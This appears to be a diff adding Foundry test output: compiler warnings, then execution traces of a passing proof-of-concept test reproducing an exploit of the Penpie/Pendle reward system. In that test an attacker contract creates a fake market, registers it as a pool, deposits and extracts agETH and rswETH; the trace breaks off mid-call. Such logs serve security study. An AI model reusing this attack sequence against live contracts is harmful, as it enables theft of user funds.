@@ -1,0 +1,1029 @@
+Compiling 28 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.44s
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/interface.sol:886:5:
+    |
+886 |     function WETH() external view returns (address);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1598:5:
+     |
+1598 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1850:5:
+     |
+1850 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:2560:5:
+     |
+2560 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:3759:5:
+     |
+3759 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/2024-09/Penpiexyzio_exp.sol:357:5:
+    |
+357 |     struct Pool {
+    |     ^ (Relevant source part starts here and spans across multiple lines).
+Note: The shadowed declaration is here:
+    --> src/test/interface.sol:2123:1:
+     |
+2123 | interface Pool {
+     | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (6321): Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.
+  --> src/test/2024-09/Penpiexyzio_exp.sol:54:75:
+   |
+54 |     function transfer(address to, uint256 amount) public virtual returns (bool) {
+   |                                                                           ^^^^
+
+Warning (6321): Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.
+  --> src/test/2024-09/Penpiexyzio_exp.sol:78:55:
+   |
+78 |     function getRewardTokens() external view returns (address[] memory) {
+   |                                                       ^^^^^^^^^^^^^^^^
+
+Warning (2018): Function state mutability can be restricted to pure
+  --> src/test/2024-09/Penpiexyzio_exp.sol:75:5:
+   |
+75 |     function exchangeRate() external view returns (uint256 res) {
+   |     ^ (Relevant source part starts here and spans across multiple lines).
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20453)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20453] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 571.70ms (227.63µs CPU time)
+
+Ran 1 test for src/test/2024-09/Penpiexyzio_exp.sol:Penpiexyz_io_exp
+[PASS] testPoC_A() (gas: 18314272)
+Logs:
+  Final balance in agETH : 1367721940734251263418
+  Final balance in rswETH: 901793090984736278006
+
+Traces:
+  [19151372] Penpiexyz_io_exp::testPoC_A()
+    ├─ [1928090] → new Attacker@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 9604 bytes of code
+    ├─ [14339159] Attacker::createMarket()
+    │   ├─ [5569926] 0x35A338522a435D46f77Be32C70E215B813D0e3aC::createYieldContract(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1735171200 [1.735e9], true)
+    │   │   ├─ [245] Attacker::assetInfo() [staticcall]
+    │   │   │   └─ ← [Return] 0, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 8
+    │   │   ├─ [949] Attacker::name() [staticcall]
+    │   │   │   └─ ← [Return] ""
+    │   │   ├─ [1038] Attacker::symbol() [staticcall]
+    │   │   │   └─ ← [Return] ""
+    │   │   ├─ [1230391] → new <unknown>@0x8B11e74A1A359ACe622DD5302dc238EC8f16Aba4
+    │   │   │   └─ ← [Return] 5804 bytes of code
+    │   │   ├─ [3966428] → new <unknown>@0x5f3B1B90aB129F021dbD376d880dC33153f0c7A2
+    │   │   │   └─ ← [Return] 19464 bytes of code
+    │   │   ├─ [24354] 0x8B11e74A1A359ACe622DD5302dc238EC8f16Aba4::initialize(0x5f3B1B90aB129F021dbD376d880dC33153f0c7A2)
+    │   │   │   ├─ emit Initialized(: 1)
+    │   │   │   └─ ← [Return] 
+    │   │   ├─  emit topic 0: 0xaa79d8f17776adeaa316c5411b72e8b0057d064974fa8748f32492ecaa22ecd1
+    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │        topic 2: 0x00000000000000000000000000000000000000000000000000000000676c9c80
+    │   │   │           data: 0x0000000000000000000000008b11e74a1a359ace622dd5302dc238ec8f16aba40000000000000000000000005f3b1b90ab129f021dbd376d880dc33153f0c7a2
+    │   │   └─ ← [Return] 0x8B11e74A1A359ACe622DD5302dc238EC8f16Aba4, 0x5f3B1B90aB129F021dbD376d880dC33153f0c7A2
+    │   ├─ [5149258] 0x6fcf753f2C67b83f7B09746Bbc4FA0047b35D050::createNewMarket(0x8B11e74A1A359ACe622DD5302dc238EC8f16Aba4, 23352202321000000000 [2.335e19], 1032480618000000000 [1.032e18], 1998002662000000 [1.998e15])
+    │   │   ├─ [439] 0x35A338522a435D46f77Be32C70E215B813D0e3aC::isPT(0x8B11e74A1A359ACe622DD5302dc238EC8f16Aba4) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   ├─ [289] 0x8B11e74A1A359ACe622DD5302dc238EC8f16Aba4::isExpired() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [5020014] → new <unknown>@0x46F6eE9880d08C66DdB22a4645806672CDb1fb61
+    │   │   │   ├─ [419] 0x8B11e74A1A359ACe622DD5302dc238EC8f16Aba4::SY() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   ├─ [5435] 0x47D74516B33eD5D70ddE7119A40839f6Fcc24e57::pendle()
+    │   │   │   │   ├─ [552] 0x7762CbfA8f62999A8A40D800b751686e99A31C9a::pendle() [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000808507121b80c02388fad14726482e061b8da827
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000808507121b80c02388fad14726482e061b8da827
+    │   │   │   ├─ [419] 0x8B11e74A1A359ACe622DD5302dc238EC8f16Aba4::SY() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   ├─ [465] 0x8B11e74A1A359ACe622DD5302dc238EC8f16Aba4::YT() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000005f3b1b90ab129f021dbd376d880dc33153f0c7a2
+    │   │   │   ├─ [22635] 0x83d6fa7F8904299F4a9499fE83b6ae3f21FfbA57::ca7dab2c(000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000066d756d3) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   ├─ [518] 0x8B11e74A1A359ACe622DD5302dc238EC8f16Aba4::expiry() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000676c9c80
+    │   │   │   └─ ← [Return] 24428 bytes of code
+    │   │   ├─  emit topic 0: 0xae811fae25e2770b6bd1dcb1475657e8c3a976f91d1ebf081271db08eef920af
+    │   │   │        topic 1: 0x00000000000000000000000046f6ee9880d08c66ddb22a4645806672cdb1fb61
+    │   │   │        topic 2: 0x0000000000000000000000008b11e74a1a359ace622dd5302dc238ec8f16aba4
+    │   │   │           data: 0x0000000000000000000000000000000000000000000000014413b0492241ea000000000000000000000000000000000000000000000000000e541ba6d95da4000000000000000000000000000000000000000000000000000007192c3eedc580
+    │   │   └─ ← [Return] 0x46F6eE9880d08C66DdB22a4645806672CDb1fb61
+    │   ├─ [2735140] 0xd20c245e1224fC2E8652a283a8f5cAE1D83b353a::registerPenpiePool(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61)
+    │   │   ├─ [2727845] 0x588f5e5d85C85CaC5de4A1616352778eCD9110d3::registerPenpiePool(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61) [delegatecall]
+    │   │   │   ├─ [567] 0x6fcf753f2C67b83f7B09746Bbc4FA0047b35D050::isValidMarket(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   ├─ [404] 0x46F6eE9880d08C66DdB22a4645806672CDb1fb61::readTokens() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000008b11e74a1a359ace622dd5302dc238ec8f16aba40000000000000000000000005f3b1b90ab129f021dbd376d880dc33153f0c7a2
+    │   │   │   ├─ [1020] 0x8B11e74A1A359ACe622DD5302dc238EC8f16Aba4::symbol() [staticcall]
+    │   │   │   │   └─ ← [Return] "PT--26DEC2024"
+    │   │   │   ├─ [2704812] 0x6E799758CEE75DAe3d84e09D40dc416eCf713652::registerPool(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, 0, "PT--26DEC2024-PRT", "PT--26DEC2024-PRT")
+    │   │   │   │   ├─ [2697478] 0xFF51c6b493c1E4Df4e491865352353EAdff0f9f8::registerPool(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, 0, "PT--26DEC2024-PRT", "PT--26DEC2024-PRT") [delegatecall]
+    │   │   │   │   │   ├─ [856758] 0xaE8e4bc88f792297a808CB5f32D4950FBBd8AEbA::c730c160(00000000000000000000000046f6ee9880d08c66ddb22a4645806672cdb1fb6100000000000000000000000016296859c15289731521f199f0a5f762df6347d0000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000001150542d2d3236444543323032342d505254000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001150542d2d3236444543323032342d505254000000000000000000000000000000) [delegatecall]
+    │   │   │   │   │   │   ├─ [821492] → new <unknown>@0xC7a208C3De366df6Ac060033A8Df0a6C9f869772
+    │   │   │   │   │   │   │   ├─ emit OwnershipTransferred(previousOwner: 0x0000000000000000000000000000000000000000, newOwner: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652)
+    │   │   │   │   │   │   │   └─ ← [Return] 3642 bytes of code
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000c7a208c3de366df6ac060033a8df0a6c9f869772
+    │   │   │   │   │   ├─ [1471153] 0x16296859C15289731521F199F0a5f762dF6347d0::createRewarder(0xC7a208C3De366df6Ac060033A8Df0a6C9f869772, 0x808507121B80c02388fAd14726482e061B8da827)
+    │   │   │   │   │   │   ├─ [1463852] 0x8E1aAB7E4127E70E3d3cd1E3D4788E3A31Ff78A9::createRewarder(0xC7a208C3De366df6Ac060033A8Df0a6C9f869772, 0x808507121B80c02388fAd14726482e061B8da827) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [1460549] 0xaE8e4bc88f792297a808CB5f32D4950FBBd8AEbA::b425b13c(000000000000000000000000c7a208c3de366df6ac060033a8df0a6c9f869772000000000000000000000000808507121b80c02388fad14726482e061b8da82700000000000000000000000016296859c15289731521f199f0a5f762df6347d00000000000000000000000006e799758cee75dae3d84e09d40dc416ecf713652) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ [1425684] → new <unknown>@0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B
+    │   │   │   │   │   │   │   │   │   ├─ emit OwnershipTransferred(previousOwner: 0x0000000000000000000000000000000000000000, newOwner: 0x16296859C15289731521F199F0a5f762dF6347d0)
+    │   │   │   │   │   │   │   │   │   ├─ [266] 0xC7a208C3De366df6Ac060033A8Df0a6C9f869772::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 6418 bytes of code
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000f89140e3ceae2d8c5da63fd120fd0be845edeb1b
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000f89140e3ceae2d8c5da63fd120fd0be845edeb1b
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000f89140e3ceae2d8c5da63fd120fd0be845edeb1b
+    │   │   │   │   │   ├─ [32429] 0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4::setPoolInfo(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, true)
+    │   │   │   │   │   │   ├─ [25125] 0x79D4E26484C6a16531C8c90F8B22af99FeA83ce3::setPoolInfo(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, true) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   ├─ [154856] 0x16296859C15289731521F199F0a5f762dF6347d0::add(0, 0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, 0xC7a208C3De366df6Ac060033A8Df0a6C9f869772, 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B)
+    │   │   │   │   │   │   ├─ [154046] 0x8E1aAB7E4127E70E3d3cd1E3D4788E3A31Ff78A9::add(0, 0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, 0xC7a208C3De366df6Ac060033A8Df0a6C9f869772, 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Add(param0: 0, param1: 0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, param2: 0xC7a208C3De366df6Ac060033A8Df0a6C9f869772, param3: 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B)
+    │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   ├─ emit PoolAdded(: 0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, : 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B, : 0xC7a208C3De366df6Ac060033A8Df0a6C9f869772)
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 
+    │   │   │   ├─  emit topic 0: 0xfcc25990cb1b80f9886861b815be69363f900d0af39c99a521b4368c96cf6f36
+    │   │   │   │           data: 0x00000000000000000000000046f6ee9880d08c66ddb22a4645806672cdb1fb610000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000001150542d2d3236444543323032342d505254000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001150542d2d3236444543323032342d505254000000000000000000000000000000
+    │   │   │   └─ ← [Stop] 
+    │   │   └─ ← [Return] 
+    │   ├─ [129237] 0x5f3B1B90aB129F021dbD376d880dC33153f0c7A2::mintPY(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   ├─ [577] Attacker::balanceOf(0x5f3B1B90aB129F021dbD376d880dC33153f0c7A2) [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   │   ├─ [225] Attacker::exchangeRate() [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   │   ├─ emit NewInterestIndex(param0: 1000000000000000000 [1e18])
+    │   │   ├─ [535] Attacker::getRewardTokens() [staticcall]
+    │   │   │   └─ ← [Return] []
+    │   │   ├─ [437] Attacker::rewardIndexesCurrent()
+    │   │   │   └─ ← [Return] []
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000 [1e18])
+    │   │   ├─ [24763] 0x8B11e74A1A359ACe622DD5302dc238EC8f16Aba4::mintByYT(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000 [1e18])
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000 [1e18])
+    │   │   │   └─ ← [Return] 
+    │   │   ├─ emit Mint(param0: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param3: 1000000000000000000 [1e18], param4: 1000000000000000000 [1e18])
+    │   │   ├─ [577] Attacker::balanceOf(0x5f3B1B90aB129F021dbD376d880dC33153f0c7A2) [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   ├─ [555] 0x8B11e74A1A359ACe622DD5302dc238EC8f16Aba4::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   ├─ [25438] 0x8B11e74A1A359ACe622DD5302dc238EC8f16Aba4::transfer(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, 1000000000000000000 [1e18])
+    │   │   ├─ emit Transfer(from: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, value: 1000000000000000000 [1e18])
+    │   │   └─ ← [Return] true
+    │   ├─ [394107] 0x46F6eE9880d08C66DdB22a4645806672CDb1fb61::mint(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000 [1e18], 1000000000000000000 [1e18])
+    │   │   ├─ [4876] 0x6fcf753f2C67b83f7B09746Bbc4FA0047b35D050::getMarketConfig(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000008270400d528c34e1596ef367eedec99080a1b59200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000050
+    │   │   ├─ [1060] 0x5f3B1B90aB129F021dbD376d880dC33153f0c7A2::pyIndexCurrent()
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   ├─ [1036] Attacker::getRewardTokens() [staticcall]
+    │   │   │   └─ ← [Return] [0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6]
+    │   │   ├─ [22909] Attacker::claimRewards(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61)
+    │   │   │   └─ ← [Return] []
+    │   │   ├─ [47864] 0x47D74516B33eD5D70ddE7119A40839f6Fcc24e57::redeemMarketReward()
+    │   │   │   ├─ [47484] 0x7762CbfA8f62999A8A40D800b751686e99A31C9a::redeemMarketReward() [delegatecall]
+    │   │   │   │   ├─ [2655] 0x27b1dAcd74688aF24a64BD3C9C1B143118740784::isValidMarket(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [2567] 0x1A6fCc85557BC4fB7B534ed835a03EF056552D52::isValidMarket(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [2567] 0x3d75Bd20C983edb5fD218A1b7e0024F1056c7A2F::isValidMarket(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [567] 0x6fcf753f2C67b83f7B09746Bbc4FA0047b35D050::isValidMarket(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   ├─ emit MarketClaimReward(param0: 0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, param1: 0)
+    │   │   │   │   └─ ← [Return] 
+    │   │   │   └─ ← [Return] 
+    │   │   ├─ [2727] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::balanceOf(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [2779] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::balanceOf(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [2610] 0x808507121B80c02388fAd14726482e061B8da827::balanceOf(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ECRecover: [0x0000000000000000000000000000000000000001], value: 1000)
+    │   │   ├─ [8859] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(ECRecover: [0x0000000000000000000000000000000000000001])
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [1036] Attacker::getRewardTokens() [staticcall]
+    │   │   │   └─ ← [Return] [0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6]
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 999999999999999000 [9.999e17])
+    │   │   ├─ [4859] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [1038] 0x83d6fa7F8904299F4a9499fE83b6ae3f21FfbA57::4af74b68(000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000066d756d3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001) [delegatecall]
+    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001
+    │   │   ├─  emit topic 0: 0x5c0e21d57bb4cf91d8fe238d6f92e2685a695371b19209afcce6217b478f83e1
+    │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000066d756d3
+    │   │   │           data: 0x000000000000000000000000000000000000000000000000016e13ce319d83ff
+    │   │   ├─ [577] Attacker::balanceOf(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61) [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   │   ├─ [555] 0x8B11e74A1A359ACe622DD5302dc238EC8f16Aba4::balanceOf(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61) [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   │   ├─ emit Mint(param0: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 999999999999999000 [9.999e17], param2: 1000000000000000000 [1e18], param3: 1000000000000000000 [1e18])
+    │   │   └─ ← [Return] 999999999999999000 [9.999e17], 1000000000000000000 [1e18], 1000000000000000000 [1e18]
+    │   ├─ [24363] 0x46F6eE9880d08C66DdB22a4645806672CDb1fb61::approve(0x6E799758CEE75DAe3d84e09D40dc416eCf713652, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ emit Approval(owner: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   └─ ← [Return] true
+    │   ├─ [232043] 0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4::depositMarket(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, 999999999999999000 [9.999e17])
+    │   │   ├─ [231245] 0x79D4E26484C6a16531C8c90F8B22af99FeA83ce3::depositMarket(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, 999999999999999000 [9.999e17]) [delegatecall]
+    │   │   │   ├─ [220988] 0x6E799758CEE75DAe3d84e09D40dc416eCf713652::depositMarket(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 999999999999999000 [9.999e17])
+    │   │   │   │   ├─ [220178] 0xFF51c6b493c1E4Df4e491865352353EAdff0f9f8::depositMarket(0x46F6eE9880d08C66DdB22a4645806672CDb1fb61, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 999999999999999000 [9.999e17]) [delegatecall]
+    │   │   │   │   │   ├─ [75388] 0x46F6eE9880d08C66DdB22a4645806672CDb1fb61::transferFrom(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, 999999999999999000 [9.999e17])
+    │   │   │   │   │   │   ├─ [1036] Attacker::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] [0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6]
+    │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, value: 999999999999999000 [9.999e17])
+    │   │   │   │   │   │   ├─ [2859] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [5292] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(0x6E799758CEE75DAe3d84e09D40dc416eCf713652)
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000a650808e0e24a2ec4de6d
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [128878] 0xC7a208C3De366df6Ac060033A8Df0a6C9f869772::mint(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 999999999999999000 [9.999e17])
+    │   │   │   │   │   │   ├─ [13179] 0x16296859C15289731521F199F0a5f762dF6347d0::beforeReceiptTokenTransfer(0x0000000000000000000000000000000000000000, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 999999999999999000 [9.999e17])
+    │   │   │   │   │   │   │   ├─ [12375] 0x8E1aAB7E4127E70E3d3cd1E3D4788E3A31Ff78A9::beforeReceiptTokenTransfer(0x0000000000000000000000000000000000000000, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 999999999999999000 [9.999e17]) [delegatecall]
